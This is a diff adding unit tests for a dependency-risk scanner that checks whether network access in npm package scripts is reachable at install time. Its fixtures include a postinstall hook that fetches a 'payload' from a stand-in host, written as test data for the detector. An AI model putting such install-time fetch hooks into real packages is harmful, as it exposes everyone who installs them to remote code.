@@ -308,6 +308,44 @@ describe("assessDependencyArtifact", () => {
     expect(assessment.verdict).toBe("install-risk");
     expect(assessment.installReachUnproven).toBe(true);
   });
+
+  test("a capability in a non-install package script is not proven install-reachable", () => {
+    const manifest = {
+      name: "n",
+      version: "1.0.0",
+      scripts: {
+        postinstall: "node ok.js",
+        test: `node -e "fetch('https://tests.example.invalid/fixture')"`,
+      },
+    };
+    const assessment = assessDependencyArtifact(
+      [file("package.json", JSON.stringify(manifest)), file("ok.js", "console.log('linked');")],
+      manifest,
+      { codePatternSet: "javascript", entrypointResolution: "npm" },
+    );
+
+    expect(assessment.verdict).toBe("install-risk");
+    expect(assessment.capabilities).toContain("code.network-access");
+    expect(assessment.installReachableCapabilities).not.toContain("code.network-access");
+    expect(assessment.installReachUnproven).toBe(true);
+  });
+
+  test("a capability directly in an install command remains proven reachable", () => {
+    const manifest = {
+      name: "n",
+      version: "1.0.0",
+      scripts: { postinstall: `node -e "fetch('https://cdn.example.invalid/payload')"` },
+    };
+    const assessment = assessDependencyArtifact(
+      [file("package.json", JSON.stringify(manifest))],
+      manifest,
+      { codePatternSet: "javascript", entrypointResolution: "npm" },
+    );
+
+    expect(assessment.verdict).toBe("install-risk");
+    expect(assessment.installReachableCapabilities).toContain("code.network-access");
+    expect(assessment.installReachUnproven).toBe(false);
+  });
 });
 
 describe("dependencyEvidenceFindings", () => {
@@ -437,6 +475,23 @@ describe("dependencyEvidenceFindings", () => {
       parent,
     );
     expect(finding.severity).toBe("high");
+  });
+
+  test("an unproven network capability does not claim every install fetches", () => {
+    const [finding] = dependencyEvidenceFindings(
+      review([
+        evidence({
+          verdict: "install-risk",
+          automaticExecution: [{ kind: "script", name: "postinstall" }],
+          capabilities: ["code.network-access"],
+          installReachableCapabilities: [],
+        }),
+      ]),
+      parent,
+    );
+    expect(finding.severity).toBe("medium");
+    expect(finding.reason).toContain("could not statically prove");
+    expect(finding.reason).not.toContain("every consumer install makes that request");
   });
 
   test("a benign new dependency stays low risk", () => {
